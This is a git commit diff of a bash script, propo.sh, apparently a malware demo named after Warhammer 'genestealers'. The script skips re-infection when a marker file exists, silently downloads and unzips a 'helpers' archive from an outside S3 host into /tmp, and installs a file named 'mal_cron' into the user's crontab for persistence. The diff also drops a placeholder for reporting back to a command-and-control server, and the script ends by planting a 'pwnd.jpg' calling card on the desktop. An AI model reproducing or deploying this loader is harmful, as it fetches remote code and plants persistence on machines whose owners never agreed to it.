7cb741b3b2c86179f29f62c74c6a079cf5407875
Marcus <m.ar.agard@protonmail.ch>
2020-01-13 16:51:13 -0500

    Added test for pwnage

--- propo.sh
+++ propo.sh
@@ -1,14 +1,19 @@
 #!/usr/bin/env bash
+# Step 1: Check if we've already been here
+if [[ -n $(find / -name pwnd.jpg) ]]; then
+  exit 0
+fi
+# Step 2: Check identity
 CURR_USR=$(whoami)
-# Step 1: Download assisting binaries
-ZIP_URL="https://uc678aaf33e0ee4c61d4b68281f2.dl.dropboxusercontent.com/cd/0/get/Av0uZ3NfPko55_1m7sssnW8ZvF5aj-HrSCEa38PndOrMwWKqahMVMcaWagxDiwQywBWtJQifoTual9X8rOdSzTndNEB881PmsDXsqoEpo9GYxlZC9X25FqoJ7Kamyj4TcWs/file"
+# Step 3: Download assisting binaries
+ZIP_URL="https://genestealer-demo.s3.amazonaws.com/helpers.zip"
 $(curl $ZIP_URL --output /tmp/helpers.zip --silent)
 echo "File Successfully downloaded"
-# Step 2: Move to dir, unzip
+# Step 4: Move to dir, unzip
 cd /tmp
 echo "Current working directory: `pwd`"
 $(unzip -oq ./helpers.zip)
-# Step 3: Determine crontab directory
+# Step 5: Determine crontab directory
 if [[ -d "/var/spool/cron/crontabs/" ]]; then
   CRON_DIR="/var/spool/cron/crontabs/"
 elif [[ -d "/etc/cron.d/" ]]; then
@@ -16,7 +21,7 @@ elif [[ -d "/etc/cron.d/" ]]; then
 else
   CRON_DIR="No cron"
 fi
-# Step 4: Add cron file
+# Step 6: Add cron file
 echo "Cron directory: $CRON_DIR"
 if [[ $CRON_DIR != "No cron" ]]; then
   {
@@ -27,7 +32,5 @@ if [[ $CRON_DIR != "No cron" ]]; then
     mv -f ./mal_cron $CRON_DIR$CURR_USR
   }
 fi
-# Step 4: Report back to C2 (TBI)
-
-# Step 5: Leave calling card :)
+# Step 7: Leave calling card :)
 $(curl https://vignette.wikia.nocookie.net/warhammer40k/images/e/e7/Genestealer_Cultists_rise.jpg/ --output "home/$CURR_USR/Desktop/pwnd.jpg" --silent)
